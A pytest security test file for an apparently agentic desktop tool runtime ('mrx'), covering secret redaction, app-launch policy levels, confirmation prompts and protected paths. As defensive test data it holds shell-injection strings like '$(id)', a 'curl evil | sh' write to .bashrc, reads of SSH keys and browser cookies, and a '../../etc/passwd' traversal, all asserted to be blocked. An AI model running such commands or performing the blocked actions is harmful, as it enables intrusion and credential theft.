import asyncio
from pathlib import Path

import pytest

from conftest import auto_confirm
from mrx.core.security import redact, redact_text, contains_secret, SecretStore
from mrx.tools import system as sysm


def test_redaction_by_key_and_value():
    d = redact({"api_key": "abc", "password": "hunter2", "nested": {"Authorization": "Bearer abcdefghijklmnopqrstuv"},
                "text": "use sk-ant-api03-abcdefghijklmnop please", "ok": "hello", "list": ["ghp_" + "a" * 36]})
    assert d["api_key"] == d["password"] == d["nested"]["Authorization"] == "[REDACTED]"
    assert "sk-ant" not in d["text"] and d["ok"] == "hello" and d["list"] == ["[REDACTED]"]
    assert "AKIAABCDEFGHIJKLMNOP" not in redact_text("key AKIAABCDEFGHIJKLMNOP")


def test_secret_detection():
    assert contains_secret("my password is hunter2") and contains_secret("token: abcdef")
    assert not contains_secret("my project folder is on D drive")


def test_secrets_never_reach_settings_or_db(rt, monkeypatch):
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-test-secret-value-123456")
    assert rt.secrets.get("ANTHROPIC_API_KEY")
    assert "sk-ant-test" not in rt.settings.path.read_text() if rt.settings.path.exists() else True
    st = rt.status()
    assert "sk-ant-test" not in str(st)


async def test_launch_policy_levels(rt):
    lvl = lambda **a: rt.registry.effective_level(rt.registry.get("open_application"), a)
    assert lvl(name="chrome") == 1                       # known app, bare → automatic
    assert lvl(name="chrome", args=["https://x"]) == 2   # arguments → confirm
    assert lvl(name="some-random-binary") == 2           # unknown executable → confirm
    assert lvl(name="powershell") == 3 and lvl(name="C:\\Windows\\System32\\cmd.exe") == 3 and lvl(name="bash") == 3


async def test_shell_metacharacters_rejected(rt):
    auto_confirm(rt)
    for bad in ("chrome & calc", "x|y", "a;b", "$(id)", "`id`"):
        r = await rt.registry.execute("open_application", {"name": bad, "wait_s": 1})
        assert not r.success and "metacharacters" in r.error, bad
    r = await rt.registry.execute("open_application", {"name": "chrome", "args": ["--x", "a&b"], "wait_s": 1})
    assert not r.success and "metacharacters" in r.error


async def test_desktop_input_requires_confirmation_by_default(rt):
    for t in ("keyboard_type", "hotkey", "press_key", "mouse_click", "mouse_drag"):
        assert rt.registry.effective_level(rt.registry.get(t), {}) == 2, t
    assert rt.registry.effective_level(rt.registry.get("mouse_move"), {}) == 1


async def test_sensitive_locations_are_off_limits(rt, home):
    (home / ".ssh").mkdir()
    (home / ".ssh/id_rsa").write_text("PRIVATE KEY")
    for tool, args in [("read_file", {"path": ".ssh/id_rsa"}), ("create_file", {"path": ".ssh/authorized_keys", "content": "x"}),
                       ("create_file", {"path": ".bashrc", "content": "curl evil | sh"}), ("list_directory", {"path": ".ssh"}),
                       ("read_file", {"path": ".mrx/settings.json"}), ("create_file", {"path": ".mrx/mrx.db", "content": ""}),
                       ("read_file", {"path": ".mrx/browser-profile/Default/Cookies"})]:
        r = await rt.registry.execute(tool, args)
        assert not r.success and "protected" in r.error, (tool, args, r.error)
    assert (home / ".ssh/id_rsa").read_text() == "PRIVATE KEY"
    (home / "Documents/startup").mkdir()          # ordinary folders that merely share a name are fine
    r = await rt.registry.execute("create_file", {"path": "Documents/startup/plan.txt", "content": "ok"})
    assert r.success


async def test_download_filename_cannot_escape(rt, home):
    from mrx.tools import browser as b
    # the sanitiser used for every download path
    assert Path("../../etc/passwd").name == "passwd"
    import inspect
    src = inspect.getsource(b.download_file)
    assert "Path(filename).name" in src and "http(s)" in src


async def test_plugin_disable_removes_tools(rt):
    rt.set_plugin_enabled("email", False)
    assert "send_email" not in rt.registry.tools
    r = await rt.registry.execute("send_email", {"draft_id": 1})
    assert not r.success
    rt.set_plugin_enabled("email", True)
    assert "send_email" in rt.registry.tools


async def test_auto_execute_off_asks_for_state_changes_but_not_reads(rt, home):
    rt.settings.update({"automation": {"auto_execute": False}})
    assert rt.registry.effective_level(rt.registry.get("create_folder"), {}) == 2
    assert rt.registry.effective_level(rt.registry.get("list_directory"), {}) == 1
    rt.settings.update({"automation": {"confirmation_timeout_s": 0.1}})
    r = await rt.registry.execute("create_folder", {"path": "Nope"})
    assert r.status == "declined" and not (home / "Nope").exists()
